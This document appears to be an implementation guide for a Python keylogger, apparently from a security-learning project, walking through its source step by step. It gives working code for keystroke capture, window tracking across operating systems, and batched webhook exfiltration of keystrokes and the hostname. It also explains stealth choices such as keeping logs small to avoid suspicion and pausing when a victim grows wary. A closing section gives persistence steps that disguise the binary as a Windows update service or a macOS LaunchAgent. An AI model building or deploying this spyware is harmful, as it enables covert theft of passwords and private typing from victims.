# Implementation Guide

This document walks through the actual code. We'll build key features step by step and explain the decisions along the way.

## File Structure Walkthrough

```
keylogger/
├── keylogger.py          # 440 lines, complete implementation
│   ├── Imports (1-54)    # Dependencies and platform detection
│   ├── Enums (57-62)     # KeyType classification
│   ├── Config (64-82)    # KeyloggerConfig dataclass
│   ├── Models (84-107)   # KeyEvent dataclass
│   ├── WindowTracker (121-165)  # Platform window detection
│   ├── LogManager (168-218)     # File persistence
│   ├── WebhookDelivery (221-263) # Remote exfiltration
│   └── Keylogger (293-424)       # Main controller
├── test_keylogger.py     # 186 lines, component tests
└── pyproject.toml        # Dependencies and tool config
```

## Building the Data Models

### Step 1: Key Classification with Enums

What we're building: Type-safe classification of keyboard events

Create the `KeyType` enum (`keylogger.py:57-62`):

```python
class KeyType(Enum):
    """
    Enumeration of keyboard event types for type safety
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()
```

**Why this code works:**
- `Enum` from Python's standard library provides type safety at runtime
- `auto()` generates unique integer values automatically so we don't hardcode numbers
- CHAR represents printable characters (a-z, 0-9, symbols)
- SPECIAL represents control keys (Enter, Tab, arrows, modifiers)
- UNKNOWN handles edge cases where key classification fails

**Common mistakes here:**
```python
# Wrong approach: Using magic strings
key_type = "char"  # Typos like "cahrs" won't be caught

# Why this fails: No IDE autocomplete, no type checking, easy to mistype

# Good: Enum ensures type safety
key_type = KeyType.CHAR  # IDE autocompletes, type checker validates
```

### Step 2: Configuring Behavior with Dataclasses

Now we need centralized configuration that's easy to read and modify.

In `keylogger.py` (lines 64-82):

```python
@dataclass
class KeyloggerConfig:
    """
    Configuration for keylogger behavior
    """
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True

    def __post_init__(self):
        self.log_dir.mkdir(parents=True, exist_ok=True)
```

**What's happening:**
1. `@dataclass` decorator generates `__init__`, `__repr__`, and equality methods automatically
2. Type hints (`Path`, `str | None`, `float`) document expected types and enable static analysis
3. Default values let you customize only what you need: `KeyloggerConfig(max_log_size_mb=1.0)`
4. `__post_init__` runs after `__init__` and creates the log directory if it doesn't exist

**Why we do it this way:**
Dataclasses reduce boilerplate from ~20 lines of `__init__` code to 2 lines of decorator. Type hints catch bugs during development (mypy will complain if you pass `max_log_size_mb="five"` instead of `5.0`). Default values make the config self-documenting about reasonable settings.

**Alternative approaches:**
- Dictionary: `config = {"log_dir": Path.home() / ".keylogger_logs"}` works but has no type safety and keys can be mistyped
- Regular class: Verbose, requires manual `__init__` and `__repr__` implementations
- ConfigParser/YAML file: Adds external dependency and makes defaults less obvious

### Step 3: Representing Keyboard Events

In `keylogger.py` (lines 84-107):

```python
@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    """
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        """
        Convert event to dictionary for JSON serialization
        """
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower()
        }

    def to_log_string(self) -> str:
        """
        Format event as human readable log string
        """
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window_info = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window_info} {self.key}"
```

**Key parts explained:**

The `to_dict()` method converts the event to JSON-serializable format. We call `timestamp.isoformat()` to convert datetime to string like "2025-01-31T14:30:22". The `key_type.name.lower()` converts the enum to string ("char", "special") for readability in JSON.

The `to_log_string()` method formats for human reading. Example output:
```
[2025-01-31 14:30:22][Chrome - Gmail] p
[2025-01-31 14:30:23][Chrome - Gmail] a
[2025-01-31 14:30:23][Chrome - Gmail] [BACKSPACE]
```

The reason we have both methods is that logs are for human review (you scan them visually to find passwords) while JSON is for webhook delivery (parsed programmatically by C2 server).

## Building Cross-Platform Window Tracking

### The Problem

We need to know which application had focus when a keystroke occurred. Windows uses win32gui API. macOS uses NSWorkspace from AppKit. Linux uses xdotool subprocess. How do we support all three without duplicating logic?

### The Solution

Abstract platform differences behind a unified interface. Detect the OS once, call the appropriate method.

### Implementation

In `keylogger.py` (lines 121-165):

```python
class WindowTracker:
    """
    Tracks active window titles across different operating systems
    """
    @staticmethod
    def get_active_window() -> str | None:
        """
        Get the title of the currently active window
        """
        system = platform.system()

        if system == "Windows" and win32gui:
            return WindowTracker._get_windows_window()
        if system == "Darwin" and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == "Linux":
            return WindowTracker._get_linux_window()

        return None
```

This public method hides platform complexity. Callers just invoke `WindowTracker.get_active_window()` and get back a string or None regardless of OS.

**Windows implementation** (`keylogger.py:140-150`):
```python
@staticmethod
def _get_windows_window() -> str | None:
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        window_title = win32gui.GetWindowText(window)
        return f"{process.name()} - {window_title}" if window_title else process.name()
    except Exception:
        return None
```

**Important details:**
- `GetForegroundWindow()` returns a window handle (integer reference)
- `GetWindowThreadProcessId()` converts handle to process ID
- `psutil.Process(pid)` gives us the process name ("chrome.exe")
- We combine process name and window title: "chrome.exe - Gmail"
- Broad exception catching is intentional because window tracking is optional, failure shouldn't crash the keylogger

**macOS implementation** (`keylogger.py:152-158`):
```python
@staticmethod
def _get_macos_window() -> str | None:
    try:
        active_app = NSWorkspace.sharedWorkspace().activeApplication()
        return active_app.get('NSApplicationName', 'Unknown')
    except Exception:
        return None
```

**Linux implementation** (`keylogger.py:160-172`):
```python
@staticmethod
def _get_linux_window() -> str | None:
    try:
        result = subprocess.run(
            ['xdotool', 'getactivewindow', 'getwindowname'],
            capture_output=True,
            text=True,
            timeout=1,
            check=False
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception:
        return None
```

This shells out to xdotool command-line utility. We set `timeout=1` to avoid hanging if xdotool is slow. `check=False` means non-zero exit codes don't raise exceptions.

### Testing This Feature

Window tracking works if you get non-None results:

```python
from keylogger import WindowTracker

title = WindowTracker.get_active_window()
print(f"Active window: {title}")
# Output: "chrome.exe - GitHub" (Windows)
# Output: "Google Chrome" (macOS)
# Output: "GitHub — Mozilla Firefox" (Linux)
```

If you see None, check that platform-specific dependencies are installed. Windows needs pywin32, macOS needs PyObjC, Linux needs xdotool.

## Building the Log Manager

### Step 1: File Creation and Rotation

What we're building: Persistent logging with automatic file rotation

Create `LogManager` class (`keylogger.py:168-218`):

```python
class LogManager:
    """
    Manages log file rotation and writing
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.current_log_path = self._get_new_log_path()
        self.lock = Lock()
        self.logger = self._setup_logger()
```

The `Lock()` from threading module prevents race conditions. Multiple threads (keyboard listener thread, main thread) might write simultaneously. Without the lock, log files could get corrupted with interleaved writes.

**Setting up Python logging** (`keylogger.py:175-182`):
```python
def _setup_logger(self) -> logging.Logger:
    logger = logging.getLogger("keylogger")
    logger.setLevel(logging.INFO)

    handler = logging.FileHandler(self.current_log_path)
    handler.setFormatter(logging.Formatter('%(message)s'))
    logger.addHandler(handler)

    return logger
```

We use Python's logging module instead of direct file writes because it handles buffering efficiently. The `Formatter('%(message)s')` means we only write the message without timestamps (we add those in `KeyEvent.to_log_string()`).

### Step 2: Writing Events Thread-Safely

In `keylogger.py` (lines 184-189):

```python
def write_event(self, event: KeyEvent) -> None:
    """
    Write a keyboard event to the log file
    """
    with self.lock:
        self.logger.info(event.to_log_string())
        self._check_rotation()
```

The `with self.lock:` acquires the lock, executes the indented code, then releases the lock automatically. This is safer than manual `lock.acquire()` and `lock.release()` because it guarantees the lock gets released even if an exception occurs.

**What NOT to do:**
```python
# Bad: No synchronization
def write_event(self, event):
    self.logger.info(event.to_log_string())
    self._check_rotation()

# Why this fails: Two threads writing simultaneously can corrupt the file
# Thread 1 writes "[2025-01-31 14:30:22]"
# Thread 2 writes "[2025-01-31 14:30:22]" at same time
# Result: "[2025-01-[2025-01-31 14:30:22]31 14:30:22]" (corrupted)
```

### Step 3: Automatic File Rotation

In `keylogger.py` (lines 191-208):

```python
def _check_rotation(self) -> None:
    """
    Check if log rotation is needed based on file size
    """
    current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)

    if current_size_mb >= self.config.max_log_size_mb:
        self.logger.handlers[0].close()
        self.logger.removeHandler(self.logger.handlers[0])

        self.current_log_path = self._get_new_log_path()
        handler = logging.FileHandler(self.current_log_path)
        handler.setFormatter(logging.Formatter('%(message)s'))
        self.logger.addHandler(handler)
```

This checks file size after every write. When it exceeds `max_log_size_mb` (default 5.0), we close the current file and create a new one. The old file remains on disk with all historical keystrokes.

Why 5MB default? Large enough to capture significant activity (5MB of text is ~5 million characters, weeks or months of typing). Small enough to avoid suspicion (a 500MB keylog file screams malware).

## Building Webhook Delivery

### Batching Events for Stealth

What we're building: Remote exfiltration that minimizes network noise

Create `WebhookDelivery` class (`keylogger.py:221-263`):

```python
class WebhookDelivery:
    """
    Handles batched delivery of logs to remote webhook
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)
```

The `enabled` flag is True only if both `webhook_url` is set AND the requests library imported successfully. This handles cases where requests isn't installed gracefully.

**Adding events to buffer** (`keylogger.py:222-232`):
```python
def add_event(self, event: KeyEvent) -> None:
    """
    Add event to buffer and deliver if batch size reached
    """
    if not self.enabled:
        return

    with self.buffer_lock:
        self.event_buffer.append(event)

        if len(self.event_buffer) >= self.config.webhook_batch_size:
            self._deliver_batch()
```

Events accumulate in the buffer. When we hit the batch size (default 50), we send them all at once. This reduces network calls from potentially thousands per minute (fast typer) to maybe 10-20 per minute.

**Delivering the batch** (`keylogger.py:234-255`):
```python
def _deliver_batch(self) -> None:
    """
    Deliver buffered events to webhook endpoint
    """
    if not self.event_buffer or not self.config.webhook_url:
        return

    payload = {
        "timestamp": datetime.now().isoformat(),
        "host": platform.node(),
        "events": [event.to_dict() for event in self.event_buffer]
    }

    try:
        response = requests.post(
            self.config.webhook_url,
            json=payload,
            timeout=5
        )

        if response.status_code == 200:
            self.event_buffer.clear()
    except Exception as e:
        logging.error("Webhook delivery failed: %s", e)
```

**Why this specific handling:**
The payload includes `platform.node()` which gives the hostname. This helps attackers track which machine the data came from if they're monitoring multiple victims. The `timestamp` shows when the batch was sent, not when individual keys were pressed (those timestamps are in each event).

We clear the buffer only on successful delivery (`response.status_code == 200`). If the webhook is down or returns an error, events stay in the buffer and will be resent with the next batch. This prevents data loss.

**What NOT to do:**
```python
# Bad: Clear buffer before checking response
def _deliver_batch(self):
    payload = {...}
    self.event_buffer.clear()  # Data lost if request fails!
    
    response = requests.post(webhook_url, json=payload)
```

This loses keystrokes if the network is down. Better to keep events until confirmed receipt.

## Building the Main Keylogger

### Processing Keyboard Events

The core of the keylogger is the event handler (`keylogger.py:367-383`):

```python
def _on_press(self, key: Key | KeyCode) -> None:
    """
    Callback for key press events
    """
    if key == self.config.toggle_key:
        self._toggle_logging()
        return

    if not self.is_logging.is_set():
        return

    self._update_active_window()

    key_str, key_type = self._process_key(key)

    if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
        return

    event = KeyEvent(
        timestamp=datetime.now(),
        key=key_str,
        window_title=self._current_window,
        key_type=key_type
    )

    self.log_manager.write_event(event)
    self.webhook.add_event(event)
```

This callback runs every time a key is pressed. pynput calls it from its own thread, so we need to be careful about thread safety.

**Important details:**
1. Check for toggle key first. If user presses F9, pause/resume logging and early return
2. Check if logging is active. If paused, ignore the keystroke
3. Update active window (only if 0.5 seconds passed since last check)
4. Convert the key to string representation
5. Filter special keys if config says so
6. Create KeyEvent with current timestamp
7. Write to log file (thread-safe via LogManager's lock)
8. Add to webhook buffer (thread-safe via WebhookDelivery's lock)

### Converting Keys to Strings

The `_process_key` method (`keylogger.py:322-351`) handles the messy details of key conversion:

```python
def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
    """
    Convert key to string representation and type
    """
    special_keys = {
        Key.space: "[SPACE]",
        Key.enter: "[ENTER]",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]",
        Key.delete: "[DELETE]",
        Key.shift: "[SHIFT]",
        Key.shift_r: "[SHIFT]",
        # ... more mappings
    }

    if isinstance(key, Key):
        if key in special_keys:
            return special_keys[key], KeyType.SPECIAL
        return f"[{key.name.upper()}]", KeyType.SPECIAL

    if hasattr(key, 'char') and key.char:
        return key.char, KeyType.CHAR

    return "[UNKNOWN]", KeyType.UNKNOWN
```

pynput gives us two types: `Key` for special keys (Enter, Shift, arrows) and `KeyCode` for character keys (a, 1, !). We check with `isinstance(key, Key)` to determine which path to take.

For special keys, we look them up in the dictionary. Space becomes "[SPACE]", Enter becomes "[ENTER]". This makes logs readable: you can see when someone pressed Enter to submit a form.

For character keys, we extract the `char` attribute. This is just "a" for the A key, "1" for the 1 key, etc.

### Starting and Stopping

The lifecycle management (`keylogger.py:395-424`):

```python
def start(self) -> None:
    """
    Start the keylogger
    """
    print("Keylogger Started")
    # ... status output ...

    self.is_running.set()
    self.is_logging.set()

    self.listener = keyboard.Listener(on_press=self._on_press)
    self.listener.start()

    try:
        while self.is_running.is_set():
            self.listener.join(timeout=1.0)
    except KeyboardInterrupt:
        self.stop()

def stop(self) -> None:
    """
    Stop the keylogger gracefully
    """
    print("\n\n[*] Shutting down...")

    self.is_running.clear()
    self.is_logging.clear()

    if self.listener:
        self.listener.stop()

    self.webhook.flush()

    print(f"[*] Logs saved to: {self.config.log_dir}")
    print("[*] Keylogger stopped.")
```

We create a `keyboard.Listener` and pass our `_on_press` method as the callback. When we call `listener.start()`, pynput creates a new thread that monitors keyboard events.

The `while self.is_running.is_set():` loop keeps the main thread alive. We join with timeout so we can check for Ctrl+C. Without this loop, the program would exit immediately after starting the listener.

On shutdown, we call `webhook.flush()` to send any remaining buffered events. This ensures data isn't lost when the program exits.

## Security Implementation

### Toggle Key for Quick Pause

File: `keylogger.py:386-393`

```python
def _toggle_logging(self) -> None:
    """
    Toggle logging on/off with F9 key
    """
    if self.is_logging.is_set():
        self.is_logging.clear()
        print("\n[*] Logging paused. Press F9 to resume.")
    else:
        self.is_logging.set()
        print("\n[*] Logging resumed. Press F9 to pause.")
```

**What this prevents:**
If a victim gets suspicious (maybe they see unusual disk activity or network traffic), the attacker can press F9 to pause logging. When paused, keystrokes are ignored. This reduces the chance of detection during active investigation.

**How it works:**
1. Every keystroke checks if it equals `config.toggle_key` (default F9)
2. If match, call `_toggle_logging()` and return early
3. Toggle switches the `is_logging` Event (thread-safe flag)
4. When logging is off, `_on_press` returns immediately without processing

**What happens if you remove this:**
The keylogger runs continuously. If a victim opens Task Manager and sees high CPU or network usage, they might investigate. Being able to pause reduces this risk.

### Window Context for Targeted Filtering

File: `keylogger.py:360-362`

```python
def _update_active_window(self) -> None:
    """
    Update cached window title periodically
    """
    if not self.config.enable_window_tracking:
        return

    now = datetime.now()
    if (now - self._last_window_check).total_seconds() >= 0.5:
        self._current_window = self.window_tracker.get_active_window()
        self._last_window_check = now
```

**What this enables:**
Attackers can filter logs later to find only keystrokes from banking sites, password managers, or corporate VPNs. If every logged keystroke includes `[chrome.exe - Bank of America]`, attackers quickly find credentials.

**Performance optimization:**
We cache the window title for 0.5 seconds. Calling win32gui or NSWorkspace on every keystroke (potentially hundreds per second) would kill performance. With caching, we call it ~2 times per second regardless of typing speed.

## Data Flow Example

Let's trace a complete request through the system.

**Scenario:** User types "p" while focused on Gmail in Chrome

### Request Comes In

```python
# Entry point: keylogger.py:367
def _on_press(self, key):
```

At this point:
- `key` is `KeyCode(char='p')`
- `self.is_logging` is set (True)
- `self._current_window` is cached from 0.3 seconds ago
- `self.log_manager` has a file open at `/home/user/.keylogger_logs/keylog_20250131_143022.txt`
- `self.webhook.event_buffer` contains 47 events (not yet at batch size 50)

### Processing Layer

```python
# Processing: keylogger.py:373-378
key_str, key_type = self._process_key(key)

# Inside _process_key (keylogger.py:347-349):
if hasattr(key, 'char') and key.char:
    return key.char, KeyType.CHAR
```

This code:
- Checks if `key` has a `char` attribute (it does)
- Checks if `key.char` is truthy (it's "p", which is truthy)
- Returns `("p", KeyType.CHAR)`

Why it's structured this way: Some KeyCode objects don't have `char` set (dead keys, compose sequences). We need to check both conditions to avoid AttributeError or empty strings.

### Storage/Output

```python
# Final step: keylogger.py:379-383
event = KeyEvent(
    timestamp=datetime.now(),  # 2025-01-31 14:30:45.123456
    key="p",
    window_title="chrome.exe - Gmail",
    key_type=KeyType.CHAR
)

self.log_manager.write_event(event)
# Writes: "[2025-01-31 14:30:45][chrome.exe - Gmail] p"

self.webhook.add_event(event)
# Adds to buffer, now 48 events (still under 50)
```

The result is a log file containing the keystroke with full context. We store it in two places: local disk (via LogManager) and in-memory buffer (via WebhookDelivery). The webhook buffer will be sent when it reaches 50 events.

## Error Handling Patterns

### Import Failures for Optional Dependencies

When platform-specific modules aren't available, we handle it gracefully:

```python
# keylogger.py:35-54
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
```

**Why this specific handling:**
If someone runs this on Windows without pywin32 installed, we set `win32gui = None`. Later, WindowTracker checks `if system == "Windows" and win32gui:` before using it. This prevents crashes and degrades gracefully (no window titles, but keystroke logging still works).

**What NOT to do:**
```python
# Bad: Crash on import
import win32gui  # ImportError kills the program

# Bad: Silently fail without user knowledge
try:
    import win32gui
except:
    pass  # User has no idea window tracking won't work
```

This hides actual problems. Always set module to None on import failure so checks later can detect the absence.

### Webhook Delivery Failures

```python
# keylogger.py:245-255
try:
    response = requests.post(
        self.config.webhook_url,
        json=payload,
        timeout=5
    )
    
    if response.status_code == 200:
        self.event_buffer.clear()
except Exception as e:
    logging.error("Webhook delivery failed: %s", e)
```

**Important details:**
- Timeout of 5 seconds prevents hanging indefinitely if webhook is slow
- Only clear buffer on 200 status (success)
- Broad exception catch handles network errors, DNS failures, SSL cert issues
- Log the error message so debugging is possible

**Why it matters:**
Production webhooks go down. Networks are unreliable. DNS can fail. Without error handling, a single network hiccup crashes the entire keylogger. With it, we log the error and continue capturing keystrokes.

## Performance Optimizations

### Before: Naive Window Tracking

```python
# Bad: Call on every keystroke
def _on_press(self, key):
    window_title = WindowTracker.get_active_window()
    # Process key...
```

This was slow because on Windows, `win32gui.GetForegroundWindow()` + `win32process.GetWindowThreadProcessId()` + `psutil.Process()` takes ~5ms. At 100 keystrokes per second (fast typer), that's 500ms of CPU time per second, noticeable lag.

### After: Cached Window Tracking

```python
# Good: Cache for 0.5 seconds (keylogger.py:352-362)
def _update_active_window(self) -> None:
    if not self.config.enable_window_tracking:
        return
    
    now = datetime.now()
    if (now - self._last_window_check).total_seconds() >= 0.5:
        self._current_window = self.window_tracker.get_active_window()
        self._last_window_check = now
```

**What changed:**
- Store `_current_window` as instance variable
- Store `_last_window_check` timestamp
- Only update if 0.5 seconds passed

**Benchmarks:**
- Before: ~500ms CPU per second at 100 keystrokes/sec
- After: ~10ms CPU per second (50x improvement)
- Tradeoff: Window title might be stale for up to 0.5 seconds

Why 0.5 seconds? People don't switch windows faster than twice per second in normal usage. Even rapid Alt+Tab takes ~1 second. At 0.5 second granularity, we catch 99% of window switches while reducing API calls by 99%.

## Testing Strategy

### Unit Tests

Example test for LogManager:

```python
# tests/test_keylogger.py:66-94
def test_log_manager():
    with tempfile.TemporaryDirectory() as tmpdir:
        config = KeyloggerConfig(
            log_dir=Path(tmpdir),
            max_log_size_mb=0.001  # 1KB for fast rotation
        )
        
        manager = LogManager(config)
        
        for i in range(10):
            event = KeyEvent(
                timestamp=datetime.now(),
                key=f"key_{i}",
                window_title="TestApp",
                key_type=KeyType.CHAR
            )
            manager.write_event(event)
        
        log_files = list(Path(tmpdir).glob("keylog_*.txt"))
        assert len(log_files) > 0
```

**What this tests:**
- LogManager creates log files in the specified directory
- File rotation works when size limit reached
- Events are written in the correct format

**Why these specific assertions:**
We set `max_log_size_mb=0.001` (1KB) so rotation happens quickly. Writing 10 events with medium-length keys should trigger at least one rotation. We check that files exist (basic functionality) but don't count exact files since timing affects rotation points.

### Running Tests

```bash
just test  # Runs all component tests
```

If tests fail with `ImportError: No module named 'pynput'`, run `just setup` first to install dependencies.

## Common Implementation Pitfalls

### Pitfall 1: Forgetting Thread Safety

**Symptom:**
Random crashes, corrupted log files, garbled text in logs

**Cause:**
```python
# The problematic code
class LogManager:
    def write_event(self, event):
        self.log_file.write(event.to_log_string() + "\n")
        # No lock!
```

Two threads write simultaneously:
- Thread 1 writes "[2025-01-31 14:30:22] a"
- Thread 2 writes "[2025-01-31 14:30:22] b" at the same time
- Result in file: "[2025-01-[2025-01-31 14:30:22] b31 14:30:22] a" (corrupted)

**Fix:**
```python
# Correct approach (keylogger.py:184-189)
def write_event(self, event: KeyEvent) -> None:
    with self.lock:
        self.logger.info(event.to_log_string())
        self._check_rotation()
```

**Why this matters:**
Corrupted logs make keystroke analysis impossible. You might capture the password "p@ssw0rd" but the log shows "p@rd0ssw" due to interleaved writes.

### Pitfall 2: Blocking the Event Loop

**Problem:** 
Long-running operations in `_on_press` cause dropped keystrokes

**Symptom:**
Fast typing sometimes skips letters

**Cause:**
```python
# Bad: HTTP request in callback
def _on_press(self, key):
    event = create_event(key)
    requests.post(webhook_url, json=event.to_dict())  # Blocks for 200ms
```

If the user types "hello" quickly (5 keystrokes in 500ms), the first keystroke blocks for 200ms sending HTTP. The next keystroke comes in 100ms but the callback is still processing. pynput might drop it.

**Fix:**
Buffer events and send asynchronously:
```python
# Good: Add to buffer, send in batches
def _on_press(self, key):
    event = create_event(key)
    self.webhook.add_event(event)  # Fast, just appends to list
```

### Pitfall 3: Not Handling Platform Differences

**Problem:**
Code works on your development machine but crashes on different OS

**Symptom:**
`ImportError` or `AttributeError` on Windows when developed on macOS

**Cause:**
```python
# Bad: Assumes macOS
from AppKit import NSWorkspace
active_app = NSWorkspace.sharedWorkspace().activeApplication()
```

This crashes on Windows with `ImportError: No module named 'AppKit'`.

**Fix:**
```python
# Good: Platform detection (keylogger.py:35-54)
if platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

# Later usage (keylogger.py:137-139):
if system == "Darwin" and NSWorkspace:
    return WindowTracker._get_macos_window()
```

## Code Organization Principles

### Why LogManager is Separate from Keylogger

```python
# Could have been:
class Keylogger:
    def write_log(self, event):
        # File I/O directly in Keylogger
```

We separate LogManager because:
- **Single Responsibility**: Keylogger handles event processing, LogManager handles persistence
- **Testability**: Can test LogManager independently without starting the full keylogger
- **Swappability**: Easy to replace file logging with database logging by swapping LogManager implementation
- **Reusability**: Other projects can use LogManager for any kind of event logging

### Naming Conventions

- `_on_press` = Callback registered with pynput (underscore prefix is pynput convention, not private)
- `_process_key` = Private method (single underscore)
- `get_active_window` = Public API (no underscore)
- `_get_windows_window` = Private platform-specific implementation

Following these patterns makes it easier to distinguish public APIs from internal implementation.

## Dependencies

### Why Each Dependency

- **pynput** (1.8.1): Cross-platform keyboard and mouse control. We use it for keyboard event capture. Alternative (using platform-specific hooks directly) requires maintaining separate codebases for Windows/macOS/Linux.

- **requests** (2.32.5): HTTP library for webhook delivery. Could use urllib from stdlib but requests has cleaner API and better error handling. Timeout support is crucial for preventing hangs.

- **pywin32** (311): Windows-specific APIs for window tracking. Provides win32gui and win32process modules. Only needed on Windows, optional dependency.

- **psutil** (7.2.1): Cross-platform process utilities. On Windows, converts process ID to process name. More reliable than parsing Task Manager output.

- **pyobjc-framework-Cocoa** (12.1): macOS-specific framework for accessing NSWorkspace. Only needed on macOS, optional dependency.

### Dependency Security

Check for vulnerabilities:
```bash
pip install pip-audit
pip-audit
```

If you see CVEs in dependencies, check if they affect our usage. For example, a CSRF vulnerability in requests doesn't matter if we only make POST requests to our own webhook endpoint, not handling user input.

## Build and Deploy

### Building

```bash
just setup    # Create venv, install dependencies
just test     # Run tests
just lint     # Run linting checks
```

This produces no artifacts. The keylogger runs from source as `python keylogger.py`.

To create a standalone executable:
```bash
pyinstaller --onefile --windowed keylogger.py
```

This bundles Python interpreter + dependencies into single .exe (Windows) or binary (Linux/macOS).

### Local Development

```bash
# Start in development mode
python keylogger.py

# Logs go to ~/.keylogger_logs/
# Press F9 to pause/resume
# Ctrl+C to stop
```

### Production Deployment

For actual malware deployment (educational purposes only):

**Windows:**
```powershell
# Compile to exe
pyinstaller --onefile --noconsole keylogger.py

# Rename to look legitimate
mv dist/keylogger.exe dist/WindowsUpdateService.exe

# Add to startup (requires admin)
copy dist/WindowsUpdateService.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**macOS:**
```bash
# Create LaunchAgent plist
cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Users/victim/.config/system_update.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.system.update.plist
```

**Key differences from dev:**
- Compiled to native executable (harder to read than Python source)
- Hidden in system directories
- Configured to start automatically
- Renamed to look like legitimate system process

## Next Steps

You've seen how the code works. Now:

1. **Try the challenges** - [04-CHALLENGES.md](./04-CHALLENGES.md) has extension ideas like adding screenshot capture or clipboard monitoring
2. **Modify the code** - Change the toggle key from F9 to F12, observe how it affects behavior
3. **Experiment with batching** - Set `webhook_batch_size` to 5 and watch how often network requests occur (you'll see way more traffic)
